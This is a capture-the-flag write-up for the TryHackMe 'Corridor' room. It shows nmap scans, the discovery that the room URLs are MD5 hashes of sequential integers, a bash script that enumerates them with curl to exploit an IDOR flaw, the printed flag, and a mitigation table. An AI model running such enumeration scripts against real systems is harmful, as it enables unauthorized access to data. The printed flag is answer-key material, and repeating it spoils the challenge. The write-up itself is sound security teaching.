# CTF Write-Up: [Corridor](https://tryhackme.com/room/corridor)

> **Platform:** TryHackMe | **Difficulty:** Easy

---

## 🚩 Flag

<details>
<summary>Flag</summary>

`flag{2477ef02448ad9156661ac40a6b8862e}`

</details>

---

## 1. Reconnaissance

### Initial Nmap Scan

```
nmap <IP_ADDRESS> -vv -oN Nmap/Initial
```

```
PORT   STATE SERVICE
80/tcp open  http
```

### Detailed Nmap Scan

```
nmap <IP_ADDRESS> -p 80 -A -vv -oN Nmap/Detailed
```

| Port | Service | Version | Notes |
|------|---------|---------|-------|
| 80 | HTTP | Werkzeug httpd 2.0.3 (Python 3.10.2) | Web app — IDOR challenge |

---

## 2. Web Enumeration

### Page Source — Hidden Endpoints

Opening `http://<IP_ADDRESS>/` and inspecting the source (`F12`) revealed an image map with clickable door areas, each referencing a hex-looking hash as its `href`:

```html
<area href="c4ca4238a0b923820dcc509a6f75849b" ...>
<area href="c81e728d9d4c2f636f067f89cc14862c" ...>
<area href="eccbc87e4b5ce2fe28308fd9f2a7baf3" ...>
<area href="a87ff679a2f3e71d9181a67b7542122c" ...>
<area href="e4da3b7fbbce2345d7772b0674a318d5" ...>
...
```

### Identifying the Hash Type

The hashes were submitted to [CrackStation](https://crackstation.net/) for identification:

| Hash | Plaintext | Type |
|------|-----------|------|
| `c4ca4238a0b923820dcc509a6f75849b` | 1 | MD5 |
| `c81e728d9d4c2f636f067f89cc14862c` | 2 | MD5 |
| `eccbc87e4b5ce2fe28308fd9f2a7baf3` | 3 | MD5 |
| `a87ff679a2f3e71d9181a67b7542122c` | 4 | MD5 |
| `e4da3b7fbbce2345d7772b0674a318d5` | 5 | MD5 |

> The doors in the corridor correspond to MD5 hashes of sequential integers. The image map had **no link for room 0** — making it the hidden IDOR target.

---

## 3. Exploitation — IDOR via MD5 Hash Enumeration

### Vulnerability

The server uses MD5 hashes as object identifiers in the URL path. There is **no authorization check** — if you know (or can derive) the hash, you get access. Because the IDs are just sequential integers, they are trivially reversible.

### Generate MD5 Hash for Room 0

```bash
echo -n "0" | md5sum
# cfcd208495d565ef66e7dff9f98764da
```

### Exploit Script

The following script generates MD5 hashes for rooms, curls each endpoint, and extracts the flag:

```bash
#!/bin/bash

TARGET="<IP_ADDRESS>"
FLAG_PATTERN="flag{"

echo "======================================"
echo "  Corridor IDOR - MD5 Hash Fuzzer"
echo "  Target: http://$TARGET"
echo "======================================"

for i in $(seq 0 13); do
    HASH=$(echo -n "$i" | md5sum | cut -d' ' -f1)
    echo "[*] Trying room $i --> MD5: $HASH"

    RESPONSE=$(curl -s --max-time 5 "http://$TARGET/$HASH")

    if echo "$RESPONSE" | grep -q "$FLAG_PATTERN"; then
        FLAG=$(echo "$RESPONSE" | grep -oP '(THM|flag)\{[^}]+\}')
        echo ""
        echo "======================================"
        echo "  [+] FLAG FOUND in room $i!"
        echo "  [+] Hash: $HASH"
        echo "  [+] Flag: $FLAG"
        echo "======================================"
        exit 0
    fi
done
```

### Output

```
[*] Trying room 0 --> MD5: cfcd208495d565ef66e7dff9f98764da

======================================
  [+] FLAG FOUND in room 0!
  [+] Hash: cfcd208495d565ef66e7dff9f98764da
  [+] Flag: flag{2477ef02448ad9156661ac40a6b8862e}
======================================
```

> 🚩 `flag{2477ef02448ad9156661ac40a6b8862e}`

---

## 4. Attack Chain

```
Nmap Scan
    └─► Port 80 — Werkzeug/Python web app

F12 Page Source
    └─► Image map hrefs are MD5 hashes

CrackStation
    └─► Hashes = md5(1) through md5(13) — sequential integers

Room 0 missing from image map
    └─► md5("0") = cfcd208495d565ef66e7dff9f98764da

curl http://<IP_ADDRESS>/cfcd208495d565ef66e7dff9f98764da
    └─► Flag found — IDOR confirmed
```

---

## 5. Vulnerabilities & Mitigations

| # | Vulnerability | Impact | Mitigation |
|---|---|---|---|
| 1 | MD5 hashes of sequential integers used as object IDs | Trivially enumerable — attacker can access any room | Use cryptographically random, unguessable tokens (e.g. UUID v4) |
| 2 | No server-side authorization check on endpoints | Any hash resolves regardless of user session | Enforce access control on every route — validate user has permission to view the resource |
| 3 | Security through obscurity (hidden URL not linked in UI) | Absence of a link does not prevent access | Never rely on obscurity; always enforce server-side authorization |

---

*Corridor — TryHackMe | Rooted ✅*
